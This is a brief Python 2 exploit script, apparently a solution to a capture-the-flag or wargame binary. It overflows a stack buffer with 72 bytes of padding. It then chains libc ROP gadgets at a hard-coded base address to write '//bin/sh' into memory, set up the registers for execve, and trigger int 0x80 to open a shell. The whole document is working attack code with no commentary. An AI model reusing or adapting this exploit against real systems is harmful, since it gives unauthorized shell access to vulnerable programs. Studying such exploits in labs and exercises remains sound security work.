#!/usr/bin/python
from struct import pack

base = 0xb7e06000

def r(x):
	return x+base

def p32(x):
	return pack("I",x)

shell_addr = 0xb7fd4220
padding = 'A'*72

xor_eax = p32(r(0x0002c6ac))
pop_eax = p32(r(0x00023dc7))
mov_pedx_eax = p32(r(0x0006cafb))
pop_ebx = p32(r(0x00017fe5))
pop_ecx = p32(r(0x000b5e97))
pop_edx = p32(r(0x00001aa6))
xor_eax_ebx__pop_ebx = p32(r(0x0002f74d))
int80 = p32(r(0x00002c8f))

rop = pop_edx
rop += p32(shell_addr)
rop += pop_eax
rop += "//bi"
rop += mov_pedx_eax

rop += pop_edx
rop += p32(shell_addr+4)
rop += pop_eax
rop += "n/sh"
rop += mov_pedx_eax

rop += pop_edx
rop += p32(shell_addr+8)
rop += xor_eax
rop += mov_pedx_eax

rop += pop_ecx
rop += p32(shell_addr+8)

#rop += pop_edx
#rop += p32(shell_addr+8)

rop += pop_ebx
rop += p32(0x01bbccd4)
rop += pop_eax
rop += p32(0x01bbccdf)
rop += xor_eax_ebx__pop_ebx
rop += p32(shell_addr)
rop += int80


print padding+rop
